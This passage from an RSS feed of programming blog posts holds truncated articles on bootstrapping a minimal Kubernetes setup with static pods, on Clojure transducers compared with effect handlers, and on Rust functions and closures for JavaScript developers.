</li>
</ul>
<p>
Let's take a closer look at what each of these do, according to <a href="https://kubernetes.io/docs/concepts/overview/components/">the docs</a>. First,
<strong>kubelet</strong>:
</p>
<blockquote>
<p>
An agent that runs on each node in the cluster. It makes sure that containers
are running in a Pod.
</p>
</blockquote>
<p>
That sounds simple enough. What about the <strong>container runtime</strong>?
</p>
<blockquote>
<p>
The container runtime is the software that is responsible for running
containers.
</p>
</blockquote>
<p>
Tremendously informative. But if you're familiar with Docker, than you should
have a basic idea of what it does. (The details of the separation of concerns
between the container runtime and kubelet are actually a bit subtle, but I won't
be digging into them here.)
</p>
<p>
And the <strong>API server</strong>?
</p>
<blockquote>
<p>
The API server is a component of the Kubernetes control plane that exposes the
Kubernetes API. The API server is the front end for the Kubernetes control
plane.
</p>
</blockquote>
<p>
Anyone who's ever done anything with Kubernetes has interacted with the API,
either directly or through kubectl. It's the core of what makes Kubernetes
Kubernetes, the brain that turns the mountains of YAML we all know and love (?)
into running infrastructure. It seems obvious that we'll want to get it running
for our minimal setup.
</p>
<h2 id="headline-2">
Prerequisites If You Want to Follow Along
</h2>
<ul>
<li>
<p>
A Linux virtual or corporeal machine you're OK messing around with as
root (I'm using Ubuntu 18.04 on a VM).
</p>
</li>
<li>
<p>
That's it!
</p>
</li>
</ul>
<h2 id="headline-3">
The Boring Setup
</h2>
<p>
The machine we're using needs Docker installed. (I'm not going to dig too much
into how Docker and containers work; there are some <a href="https://blog.lizzie.io/linux-containers-in-500-loc.html">amazing rabbit holes</a> already
out there if you're interested.) Let's just install it using <code>apt</code>:
</p>
<div>
<div><pre><code data-lang="text">$ sudo apt install docker.io
$ sudo systemctl start docker</code></pre></div>
</div>
<p>
Next we'll need to get the Kubernetes binaries. We actually only need kubelet to
bootstrap our "cluster", since we can use kubelet to run the other server
components. We'll also grab kubectl to interact with our cluster once it's up
and running.
</p>
<div>
<div><pre><code data-lang="text">$ curl -L https://dl.k8s.io/v1.18.5/kubernetes-server-linux-amd64.tar.gz &gt; server.tar.gz
$ tar xzvf server.tar.gz
$ cp kubernetes/server/bin/kubelet .
$ cp kubernetes/server/bin/kubectl .
$ ./kubelet --version
Kubernetes v1.18.5</code></pre></div>
</div>
<h2 id="headline-4">
Off To The Races
</h2>
<p>
What happens when we try to run kubelet?
</p>
<div>
<div><pre><code data-lang="text">$ ./kubelet
F0609 04:03:29.105194    4583 server.go:254] mkdir /var/lib/kubelet: permission denied</code></pre></div>
</div>
<p>
kubelet needs to run as root; fair enough, since it's tasked with managing the
entire node. Let's see what the CLI options look like:
</p>
<div>
<div><pre><code data-lang="text">$ ./kubelet -h
&lt;far too much output to copy here&gt;
$ ./kubelet -h | wc -l
284</code></pre></div>
</div>
<p>
Holy cow, that's a lot of options! Thankfully we'll only need a couple of them
for our setup. Here's an option that looks kind of interesting:
</p>
<blockquote>
<p>
<code>--pod-manifest-path</code> string
</p>
<p>
Path to the directory containing static pod files to run, or the path to a
single static pod file. Files starting with dots will be ignored. (DEPRECATED:
This parameter should be set via the config file specified by the Kubelet's
–config flag. See
<a href="https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/">https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/</a> for
more information.)
</p>
</blockquote>
<p>
This option allows us to run <a href="https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/">static pods</a>, which are pods that aren't managed
through the Kubernetes API. Static pods aren't that common in day-to-day
Kubernetes usage but are very useful for bootstrapping clusters, which is
exactly what we're trying to do here. We're going to ignore the loud deprecation
warning (again, don't run this in prod!) and see if we can run a pod.
</p>
<p>
First we'll make a static pod directory and run kubelet:
</p>
<div>
<div><pre><code data-lang="text">$ mkdir pods
$ sudo ./kubelet --pod-manifest-path=pods</code></pre></div>
</div>
<p>
Then, in another terminal/tmux window/whatever, we'll make a pod manifest:
</p>
<div>
<div><pre><code data-lang="text">$ cat &lt;&lt;EOF &gt; pods/hello.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hello
spec:
  containers:
  - image: busybox
    name: hello
    command: ["echo", "hello world!"]
EOF</code></pre></div>
</div>
<p>
kubelet starts spitting out some warnings; other than that it anti-climatically
appears that nothing really happened. But not so! Let's check Docker:
</p>
<div>
<div><pre><code data-lang="text">$ sudo docker ps -a
CONTAINER ID        IMAGE                  COMMAND                 CREATED             STATUS                      PORTS               NAMES
8c8a35e26663        busybox                "echo 'hello world!'"   36 seconds ago      Exited (0) 36 seconds ago                       k8s_hello_hello-mink8s_default_ab61ef0307c6e0dee2ab05dc1ff94812_4
68f670c3c85f        k8s.gcr.io/pause:3.2   "/pause"                2 minutes ago       Up 2 minutes                                    k8s_POD_hello-mink8s_default_ab61ef0307c6e0dee2ab05dc1ff94812_0
$ sudo docker logs k8s_hello_hello-mink8s_default_ab61ef0307c6e0dee2ab05dc1ff94812_4
hello world!</code></pre></div>
</div>
<p>
kubelet read the pod manifest and instructed Docker to start a couple of
containers according to our specification. (If you're wondering about that
"pause" container, it's Kubernetes hackery that's used to reap zombie processes
—see <a href="https://www.ianlewis.org/en/almighty-pause-container">this blog post</a> for the gory details.) kubelet will run our <code>busybox</code>
container with our command and restart it ad infinitum until the static pod is
removed.
</p>
<p>
Let's congratulate ourselves: we've just figured out one of the world's most
convoluted ways of printing out text to the terminal!
</p>
<h2 id="headline-5">
Getting etcd running
</h2>
<p>
Our eventual goal is to run the Kubernetes API, but in order to do that we'll
need <a href="https://etcd.io/">etcd</a> running first. A static pod ought to fit the bill. Let's run a minimal
etcd cluster by putting the following in a file in the <code>pods</code> directory
(e.g. <code>pods/etcd.yaml</code>):
</p>
<div>
<div><pre><code data-lang="yaml"><span>apiVersion</span>: v1
<span>kind</span>: Pod
<span>metadata</span>:
  <span>name</span>: etcd
  <span>namespace</span>: kube-system
<span>spec</span>:
  <span>containers</span>:
  - <span>name</span>: etcd
    <span>command</span>:
    - etcd
    - --data-dir=/var/lib/etcd
    <span>image</span>: k8s.gcr.io/etcd:<span>3.4.3-0</span>
    <span>volumeMounts</span>:
    - <span>mountPath</span>: /var/lib/etcd
      <span>name</span>: etcd-data
  <span>hostNetwork</span>: <span>true</span>
  <span>volumes</span>:
  - <span>hostPath</span>:
      <span>path</span>: /var/lib/etcd
      <span>type</span>: DirectoryOrCreate
    <span>name</span>: etcd-data</code></pre></div>
</div>
<p>
If you've ever worked with Kubernetes, this kind of YAML file should look
familiar. There are only two slightly unusual things worth noting:
</p>
<ul>
<li>
<p>
We mounted the host's <code>/var/lib/etcd</code> to the pod so that the etcd data will
survive restarts (if we didn't do this the cluster state would get wiped every
time the pod restarted, which would be a drag even for a minimal Kubernetes
setup).
</p>
</li>
<li>
<p>
We set <code>hostNetwork: true</code> which, unsurprisingly, sets up the etcd pod to use
the host network instead of the pod-internal network (this will make it easier
for the API server to find the etcd cluster).
</p>
</li>
</ul>
<p>
Some quick sanity checks show that etcd is indeed listening on localhost and
writing to disk:
</p>
<div>
<div><pre><code data-lang="text">$ curl localhost:2379/version
{"etcdserver":"3.4.3","etcdcluster":"3.4.0"}
$ sudo tree /var/lib/etcd/
/var/lib/etcd/
└── member
    ├── snap
    │&nbsp;&nbsp; └── db
    └── wal
        ├── 0.tmp
        └── 0000000000000000-0000000000000000.wal</code></pre></div>
</div>
<h2 id="headline-6">
Running the API server
</h2>
<p>
Getting the Kubernetes API server running is even easier. The only CLI flag we
have to pass is <code>--etcd-servers</code>, which does what you'd expect:
</p>
<div>
<div><pre><code data-lang="yaml"><span>apiVersion</span>: v1
<span>kind</span>: Pod
<span>metadata</span>:
  <span>name</span>: kube-apiserver
  <span>namespace</span>: kube-system
<span>spec</span>:
  <span>containers</span>:
  - <span>name</span>: kube-apiserver
    <span>command</span>:
    - kube-apiserver
    - --etcd-servers=http://<span>127.0.0.1</span>:<span>2379</span>
    <span>image</span>: k8s.gcr.io/kube-apiserver:v1<span>.18.5</span>
  <span>hostNetwork</span>: <span>true</span></code></pre></div>
</div>
<p>
Put that YAML file in the <code>pods</code> directory and the API server will start. Some
quick <code>curl</code> ing shows that the Kubernetes API is listening on port 8080 with
completely open access—no authentication necessary!
</p>
<div>
<div><pre><code data-lang="text">$ curl localhost:8080/healthz
ok
$ curl localhost:8080/api/v1/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "selfLink": "/api/v1/pods",
    "resourceVersion": "59"
  },
  "items": []
}</code></pre></div>
</div>
<p>
(Again, don't run this setup in production! I was a bit surprised that the
default setup is so insecure, but I assume it's to make development and testing
easier.)
</p>
<p>
And, as a nice surprise, kubectl works out of the box with no extra
configuration!
</p>
<div>
<div><pre><code data-lang="text">$ ./kubectl version
Client Version: version.Info{Major:"1", Minor:"18", GitVersion:"v1.18.5", GitCommit:"e6503f8d8f769ace2f338794c914a96fc335df0f", GitTreeState:"clean", BuildDate:"2020-06-26T03:47:41Z", GoVersion:"go1.13.9", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"18", GitVersion:"v1.18.5", GitCommit:"e6503f8d8f769ace2f338794c914a96fc335df0f", GitTreeState:"clean", BuildDate:"2020-06-26T03:39:24Z", GoVersion:"go1.13.9", Compiler:"gc", Platform:"linux/amd64"}
$ ./kubectl get pod
No resources found in default namespace.</code></pre></div>
</div>
<p>
Easy, right?
</p>
<h2 id="headline-7">
A Problem
</h2>
<p>
But digging a bit deeper, something seems amiss:
</p>
<div>
<div><pre><code data-lang="text">$ ./kubectl get pod -n kube-system
No resources found in kube-system namespace.</code></pre></div>
</div>
<p></p></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eevans.co/blog/minimum-viable-kubernetes/">https://eevans.co/blog/minimum-viable-kubernetes/</a></em></p>]]>
            </description>
            <link>https://eevans.co/blog/minimum-viable-kubernetes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743502</guid>
            <pubDate>Mon, 06 Jul 2020 00:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transducers and Effects]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23743381">thread link</a>) | @lioeters
<br/>
July 5, 2020 | http://mikeinnes.github.io/2020/06/12/transducers.html | <a href="https://web.archive.org/web/*/http://mikeinnes.github.io/2020/06/12/transducers.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  <p>Clojure has introduced a very interesting idea called ‘transducers’, which decouple sequence transformations (mapping, filtering etc) from sequence implementations like vectors, lazy lists and channels. Transducers and their benefits are well-covered elsewhere, but I’d like to explore some tradeoffs, and compare an alternative (and extremely hypothetical) design based on a staple of the functional programming world, effect handlers.</p>

<p>There are many useful operations that we can carry out on <em>sequences</em>, like mapping, filtering, interleaving, partitioning and so on. Ideally, we’d like to apply these tools to any sequence of values, including list data structures and strings but also channels and observables. Unfortunately, it’s common to have to <a href="https://github.com/ReactiveX/RxClojure">reimplement</a> each function we want for new sequences.</p>

<p>Abstracting over sequences is difficult, and requires a significantly more powerful approach than the usual polymorphism and data abstraction. To see why, imagine a somewhat-general <code>map</code> using <code>empty</code> and <code>conj</code>.</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>map</span><span>'</span><span> </span><span>[</span><span>f</span><span> </span><span>xs</span><span>]</span><span>
  </span><span>(</span><span>loop</span><span> </span><span>[</span><span>xs</span><span> </span><span>xs</span><span>
         </span><span>ys</span><span> </span><span>(</span><span>empty</span><span> </span><span>xs</span><span>)]</span><span>
    </span><span>(</span><span>if</span><span> </span><span>(</span><span>empty?</span><span> </span><span>xs</span><span>)</span><span>
      </span><span>ys</span><span>
      </span><span>(</span><span>recur</span><span> </span><span>(</span><span>rest</span><span> </span><span>xs</span><span>)</span><span>
             </span><span>(</span><span>conj</span><span> </span><span>ys</span><span> </span><span>(</span><span>f</span><span> </span><span>(</span><span>first</span><span> </span><span>xs</span><span>)))))))</span><span>
</span></code></pre></div></div>

<p>Unfortunately, aside from the fact that this has the wrong ordering for some data structures, and could only work with channels if you have language-level coroutines (which Clojure, thanks to the JVM, doesn’t), this definition of <code>map</code> simply can’t be used to produce lazy sequences. Here’s how we implement the lazy version:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>map</span><span>'</span><span> </span><span>[</span><span>f</span><span> </span><span>xs</span><span>]</span><span>
  </span><span>(</span><span>lazy-seq</span><span>
   </span><span>(</span><span>when</span><span> </span><span>(</span><span>not</span><span> </span><span>(</span><span>empty?</span><span> </span><span>xs</span><span>))</span><span>
     </span><span>(</span><span>cons</span><span> </span><span>(</span><span>f</span><span> </span><span>(</span><span>first</span><span> </span><span>xs</span><span>))</span><span> </span><span>(</span><span>map</span><span>'</span><span> </span><span>f</span><span> </span><span>(</span><span>rest</span><span> </span><span>xs</span><span>))))))</span><span>
</span></code></pre></div></div>

<p>The problem is that the basic structure of the code has changed, from an iterative (tail recursive) form ideal for eager data structures to the context-preserving recursion needed for laziness. Other constructs, like channels, might require yet different organisation, eg as a state machine.</p>

<p>Clojure resolves this with two insights:</p>

<ol>
  <li>A <em>process</em> (eg working with lists or channels in some way) can usually be seen as a kind of <code>fold</code>, with an appropriate <em>step function</em> of the form <code>result –&gt; input –&gt; result</code>.</li>
  <li><code>map</code>, <code>filter</code> and friends extend processes by <em>wrapping</em> the step function, eg <code>step' = (result, input) –&gt; step(result, f(input))</code> to map <code>f</code> alongside whatever was happening before.</li>
</ol>

<p>Processes can therefore accept step-wrapping functions (transducers) to alter their behaviour. The upshot is that you can create and compose objects representing mapping, filtering etc and use them generically on channels, sequences, vectors and so on.</p>

<p>To solve our <code>map</code> problem, we can write data structure production and lazy-sequence production (or channel production, or …) as a single ‘transducible process’. Functions like <code>map</code> and <code>filter</code> become transducers which we can hand to these processes to modify their behaviour. Thus we can write <code>map</code> only once, yet use it with many sequence types.</p>

<h2 id="a-sequence-of-caveats">A sequence of caveats</h2>

<p>The problem that transducers solve is an important one; transducers themselves are elegant in conception and clean to work with as a user. However, if you look into how transducers are put together under the hood – or try to implement one yourself – you might find them less easy on the eyes.</p>

<div><div><pre><code><span>;; Guess what this function does for your next lockdown quiz</span><span>
</span><span>(</span><span>defn</span><span> </span><span>take</span><span> </span><span>[</span><span>n</span><span>]</span><span>
  </span><span>(</span><span>fn</span><span> </span><span>[</span><span>rf</span><span>]</span><span>
    </span><span>(</span><span>let</span><span> </span><span>[</span><span>nv</span><span> </span><span>(</span><span>volatile!</span><span> </span><span>n</span><span>)]</span><span>
      </span><span>(</span><span>fn</span><span>
        </span><span>([]</span><span> </span><span>(</span><span>rf</span><span>))</span><span>
        </span><span>([</span><span>result</span><span>]</span><span> </span><span>(</span><span>rf</span><span> </span><span>result</span><span>))</span><span>
        </span><span>([</span><span>result</span><span> </span><span>input</span><span>]</span><span>
          </span><span>(</span><span>let</span><span> </span><span>[</span><span>n</span><span> </span><span>@</span><span>nv</span><span>
                </span><span>nn</span><span> </span><span>(</span><span>vswap!</span><span> </span><span>nv</span><span> </span><span>dec</span><span>)</span><span>
                </span><span>result</span><span> </span><span>(</span><span>if</span><span> </span><span>(</span><span>pos?</span><span> </span><span>n</span><span>)</span><span>
                          </span><span>(</span><span>rf</span><span> </span><span>result</span><span> </span><span>input</span><span>)</span><span>
                          </span><span>result</span><span>)]</span><span>
            </span><span>(</span><span>if</span><span> </span><span>(</span><span>not</span><span> </span><span>(</span><span>pos?</span><span> </span><span>nn</span><span>))</span><span>
              </span><span>(</span><span>ensure-reduced</span><span> </span><span>result</span><span>)</span><span>
              </span><span>result</span><span>)))))))</span><span>
</span></code></pre></div></div>

<p>The elegance of transducers is somewhat eroded as we try to make them more general, and even then they have significant limitations. In particular:</p>

<ul>
  <li>Transducers like <code>dedupe</code> and <code>take</code> create stateful step functions, which adds extra constraints needed for correctness.</li>
  <li>Others like <code>take-while</code> need an explicit cancellation mechanism, and you want to be careful not to double-wrap the cancellation. Handling initialisation and completion adds yet more burden to implementations.</li>
  <li>Transducible processes themselves <a href="https://clojure.org/reference/transducers#_creating_transducible_processes">can be hard to implement</a>, mainly because of the above concerns, but it’s also because some things (eg lazy sequences) <a href="https://github.com/clojure/clojure/blob/30a36cbe0ef936e57ddba238b7fa6d58ee1cbdce/src/jvm/clojure/lang/TransformerIterator.java">aren’t naturally built with <code>fold</code></a>.</li>
  <li>There is no support for functions that take or produce multiple sequences (<code>interleave</code>, <code>concat</code>, <code>split-with</code> etc).</li>
</ul>

<h2 id="an-effective-alternative">An effective alternative</h2>

<p>Consider the following notation for <code>mapping</code> and <code>filtering</code>, inspired by <a href="https://docs.microsoft.com/en-us/dotnet/fsharp/language-reference/sequences">F#’s list comprehensions</a>. I’m using a hypothetical C/Koka-like syntax here but all my examples could be converted to simple Clojure equivalents (<code>loop</code>/<code>recur</code> and explicit passing of variables, <code>for</code>, etc).</p>

<div><div><pre><code><span>fn</span> <span>mapping</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span> <span>{</span>
  <span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
    <span>yield</span><span>(</span><span>f</span><span>(</span><span>x</span><span>))</span>
  <span>}</span>
<span>}</span>

<span>fn</span> <span>filtering</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span> <span>{</span>
  <span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
    <span>if</span> <span>f</span><span>(</span><span>x</span><span>)</span> <span>{</span>
      <span>yield</span><span>(</span><span>x</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>As a notation, this seems abstract enough. There’s no dependence on how we get values (<code>xs</code> could be anything and iteration can use a generic protocol). It avoids expressing how we build an output sequence, or even whether we do, just what values appear in it. F# lets us omit the <code>yield</code> (eg <code>for x in xs –&gt; x^2</code>), which makes things look more like a traditional list comprehension, but for clarity we’ll keep them explicit.</p>

<p>The key idea is to make this code run via <em>effect handlers</em> (implemented in F#, with lexical scope, as ‘computation expressions’<sup id="fnref:1"><a href="#fn:1">1</a></sup>), which let us plug in a definition of <code>yield</code>. Effect handlers have their origin in strongly-typed functional programming but they are really quite lisp-y, and can be thought of as resumable exceptions.<sup id="fnref:2"><a href="#fn:2">2</a></sup></p>

<p>At the simplest, we can just create an empty array and append to it each time a value is <code>yield</code>ed:</p>

<div><div><pre><code><span>ys</span> <span>=</span> <span>[]</span>
<span>handle</span> <span>{</span>
  <span>mapping</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span>
<span>}</span> <span>with</span> <span>yield</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  <span>ys</span> <span>=</span> <span>append</span><span>(</span><span>ys</span><span>,</span> <span>x</span><span>)</span>
  <span>resume</span><span>()</span>
<span>}</span>
<span>return</span> <span>ys</span>
</code></pre></div></div>

<p><code>yield(x)</code> is a bit like throwing an exception, except that after handling it we can jump back to where we were with <code>resume</code>.</p>

<p>Instead of building a list, we can do a map-reduce without any intermediate collection being constructed.</p>

<div><div><pre><code><span>sum</span> <span>=</span> <span>0</span>
<span>handle</span> <span>{</span>
  <span>mapping</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span>
<span>}</span> <span>with</span> <span>yield</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  <span>sum</span> <span>+=</span> <span>x</span>
  <span>resume</span><span>()</span>
<span>}</span>
<span>return</span> <span>sum</span>
</code></pre></div></div>

<p>This can compile down to the tight loop we want for simple data structures.<sup id="fnref:3"><a href="#fn:3">3</a></sup> But what’s going to be really mind-bending is how straightforwardly we can turn our loop into a lazy sequence.</p>

<div><div><pre><code><span>ys</span> <span>=</span> <span>handle</span> <span>{</span>
  <span>mapping</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span>
  <span>nil</span>
<span>}</span> <span>with</span> <span>yield</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  <span>cons</span><span>(</span><span>x</span><span>,</span> <span>LazySeq</span><span>(</span><span>resume</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>What’s happening here is that <code>yield</code> doesn’t call <code>resume</code>, so the loop gets paused the first time it is called, and the whole block returns a <code>cons</code>. <code>resume</code> will get called when we try to access the tail of <code>ys</code>, restarting the loop. The loop hits the next <code>yield</code>, suspends, and returns a new <code>cons</code> with item two and a new <code>resume</code>, and so on. Eventually the <code>mapping</code> will finish and <code>resume</code> returns <code>nil</code>, completing the list.<sup id="fnref:4"><a href="#fn:4">4</a></sup></p>

<p><code>mapping</code> here takes on the role of transducer, expressing what <code>map</code> does abstractly without nailing down the details. Effect handlers then allow us to instantiate <code>mapping</code> as a set of concrete processes, and potentially very different ones depending on the context. In all we can achieve the same core goal in a wonderfully expressive way.</p>

<p>With this in mind, we can blend Clojure’s <code>into</code> and F#’s <code>seq</code> into one list comprehension construct which picks the appropriate <code>yield</code> handler for the kind of sequence we are building.</p>

<div><div><pre><code><span>fn</span> <span>map</span><span>(</span><span>f</span><span>,</span> <span>xs</span><span>)</span> <span>{</span>
  <span>into</span> <span>empty</span><span>(</span><span>xs</span><span>)</span> <span>{</span>
    <span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
      <span>yield</span><span>(</span><span>f</span><span>(</span><span>x</span><span>))</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This <code>map</code> can behave appropriately, and generate efficient code, whether <code>xs</code> is a vector, persistent list, lazy list, string, channel, observable, promise or whatever, which solves our generic implementation problem. And we can compose pipelines just like we did before with <code>(-&gt;&gt; xs (map f) (filter g))</code>.<sup id="fnref:5"><a href="#fn:5">5</a></sup></p>

<p>As F# has shown, this way of defining sequence transformations is really expressive. If we want to cancel we can just break out of the loop (or the loop/recur equivalent).</p>

<div><div><pre><code><span>// Take while</span>
<span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
  <span>if</span> <span>f</span><span>(</span><span>x</span><span>)</span> <span>{</span>
    <span>yield</span><span>(</span><span>x</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>break</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>If we need state, a local variable is enough, since the loop has its own scope.</p>

<div><div><pre><code><span>// Dedupe</span>
<span>last</span> <span>=</span> <span>nil</span>
<span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
  <span>if</span> <span>x</span> <span>!=</span> <span>last</span> <span>{</span>
    <span>yield</span><span>(</span><span>x</span><span>)</span>
  <span>}</span>
  <span>last</span> <span>=</span> <span>x</span>
<span>}</span>
</code></pre></div></div>

<p>Concatenating sequences is easy, because we can happily have multiple loops, and <code>interleave</code> is easy because we can put <code>yield</code> wherever we want. We can even use nested loops, and I’d argue that the intent is clearer in these than even the simplest transducer implementations. They strike close to the essence of the transformation, without any incidental complexity.</p>

<div><div><pre><code><span>// Concat</span>
<span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span> <span>yield</span><span>(</span><span>x</span><span>)</span> <span>}</span>
<span>for</span> <span>y</span> <span>in</span> <span>ys</span> <span>{</span> <span>yield</span><span>(</span><span>y</span><span>)</span> <span>}</span>
<span>// Interleave</span>
<span>for</span> <span>(</span><span>x</span><span>,</span> <span>y</span><span>)</span> <span>in</span> <span>zip</span><span>(</span><span>xs</span><span>,</span> <span>ys</span><span>)</span> <span>{</span>
  <span>yield</span><span>(</span><span>x</span><span>)</span>
  <span>yield</span><span>(</span><span>y</span><span>)</span>
<span>}</span>
<span>// Cartesian Product</span>
<span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
  <span>for</span> <span>y</span> <span>in</span> <span>ys</span> <span>{</span>
    <span>yield</span><span>((</span><span>x</span><span>,</span> <span>y</span><span>))</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>We can even imagine supporting multiple output sequences, so long as there’s some way of identifying them, for example to partition a channel into matching and non-matching events.</p>

<div><div><pre><code><span>// Split-with</span>
<span>into</span> <span>empty</span><span>(</span><span>xs</span><span>)</span> <span>-&gt;</span> <span>(</span><span>trues</span><span>,</span> <span>falses</span><span>)</span> <span>{</span>
  <span>for</span> <span>x</span> <span>in</span> <span>xs</span> <span>{</span>
    <span>if</span> <span>f</span><span>(</span><span>x</span><span>)</span> <span>{</span>
      <span>yield</span><span>(</span><span>trues</span><span>,</span> <span>x</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>yield</span><span>(</span><span>falses</span><span>,</span> <span>x</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<h2 id="asynchronous-evolution">Asynchronous Evolution</h2>

<p>The above examples, taking things from one bunch of sequences and putting them into another bunch, might begin to look familiar. That’s because the Shyamalan-esque twist to this story is that Clojure <em>already had this abstraction all along</em>, via the <a href="https://github.com/clojure/core.async">core.async</a> library. The relationship of <code>go</code> blocks to our generalised list comprehensions is that</p>

<ol>
  <li>Instead of iterating <code>for x in xs</code> we have an explicit <code>&lt;!</code> (take) operation, which is itself an effect; it suspends the code and falls back to a handler, which can <code>resume</code> with a value when one is available.</li>
  <li><code>yield</code> is replaced by the <code>&gt;!</code> (put) effect.</li>
  <li>Both <code>&gt;!</code> and <code>&lt;!</code> are linked to identities (channels), which means multiple inputs and outputs are supported.</li>
</ol>

<p>So we can draw a clear path from list comprehensions to async blocks, two features which might not seem all that related at first, by generalising in some ways and specialising in others. This …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://mikeinnes.github.io/2020/06/12/transducers.html">http://mikeinnes.github.io/2020/06/12/transducers.html</a></em></p>]]>
            </description>
            <link>http://mikeinnes.github.io/2020/06/12/transducers.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743381</guid>
            <pubDate>Mon, 06 Jul 2020 00:10:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust for JavaScript Developers – Functions and Control Flow]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 39 (<a href="https://news.ycombinator.com/item?id=23743363">thread link</a>) | @rkwz
<br/>
July 5, 2020 | http://www.sheshbabu.com/posts/rust-for-javascript-developers-functions-and-control-flow/ | <a href="https://web.archive.org/web/*/http://www.sheshbabu.com/posts/rust-for-javascript-developers-functions-and-control-flow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This is the third part in a series about introducing the Rust language to JavaScript developers. Here are the past chapters:</p>
<ol>
<li><a href="http://www.sheshbabu.com/posts/rust-for-javascript-developers-tooling-ecosystem-overview/">Tooling Ecosystem Overview</a></li>
<li><a href="http://www.sheshbabu.com/posts/rust-for-javascript-developers-variables-and-data-types/">Variables and Data Types</a></li>
</ol>
<h2 id="Functions"><a href="#Functions" title="Functions"></a>Functions</h2><p>Rust’s function syntax is pretty much similar to the one in JavaScript.</p>
<pre><code><span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
  <span>let</span> income <span>=</span> <span>100</span><span>;</span>
  <span>let</span> tax <span>=</span> <span>calculate_tax</span><span>(</span>income<span>)</span><span>;</span>
  <span>println!</span><span>(</span><span>"{}"</span><span>,</span> tax<span>)</span><span>;</span>
<span>}</span>

<span>fn</span> <span>calculate_tax</span><span>(</span>income<span>:</span> i32<span>)</span> <span>-&gt;</span> i32 <span>{</span>
  <span>return</span> income <span>*</span> <span>90</span> <span>/</span> <span>100</span><span>;</span>
<span>}</span></code></pre>
<p>The only difference you might see above is the type annotations for arguments and return values.</p>
<p>The <code>return</code> keyword can be skipped and it’s very common to see code without an explicit return. If you’re returning implicitly, make sure to remove the semicolon from that line. The above function can be refactored as:</p>
<pre><code>fn main() {
  let income = 100;
  let tax = calculate_tax(income);
  println!("{}", tax);
}

fn calculate_tax(income: i32) -&gt; i32 {
<span>- return income * 90 / 100;</span>
<span>+ income * 90 / 100</span>
}</code></pre>
<h2 id="Arrow-Functions"><a href="#Arrow-Functions" title="Arrow Functions"></a>Arrow Functions</h2><p>Arrow functions are a popular feature in modern JavaScript - they allow us to write functional code in a concise way.</p>
<p>Rust has something similar and they are called “Closures”. The name might be a bit confusing and would require getting used to because in JavaScript, closures can be created using both normal and arrow functions.</p>
<p>Rust’s closure syntax is very similar to JavaScript’s arrow functions:</p>
<p><strong>Without arguments:</strong></p>
<pre><code>
<span>let</span> greet <span>=</span> <span>(</span><span>)</span> <span>=</span><span>&gt;</span> console<span>.</span><span>log</span><span>(</span><span>"hello"</span><span>)</span><span>;</span>

<span>greet</span><span>(</span><span>)</span><span>;</span> </code></pre>
<pre><code>
<span>let</span> greet <span>=</span> <span>||</span> <span>println!</span><span>(</span><span>"hello"</span><span>)</span><span>;</span>

<span>greet</span><span>(</span><span>)</span><span>;</span> </code></pre>
<p><strong>With arguments:</strong></p>
<pre><code>
<span>let</span> greet <span>=</span> <span>(</span>msg<span>)</span> <span>=</span><span>&gt;</span> console<span>.</span><span>log</span><span>(</span>msg<span>)</span><span>;</span>

<span>greet</span><span>(</span><span>"good morning!"</span><span>)</span><span>;</span> </code></pre>
<pre><code>
<span>let</span> greet <span>=</span> <span>|</span>msg<span>:</span> <span>&amp;</span>str<span>|</span> <span>println!</span><span>(</span><span>"{}"</span><span>,</span> msg<span>)</span><span>;</span>

<span>greet</span><span>(</span><span>"good morning!"</span><span>)</span><span>;</span> </code></pre>
<p><strong>Returning values:</strong></p>
<pre><code>
<span>let</span> add <span>=</span> <span>(</span>a<span>,</span> b<span>)</span> <span>=</span><span>&gt;</span> a <span>+</span> b<span>;</span>

<span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span><span>;</span> </code></pre>
<pre><code>
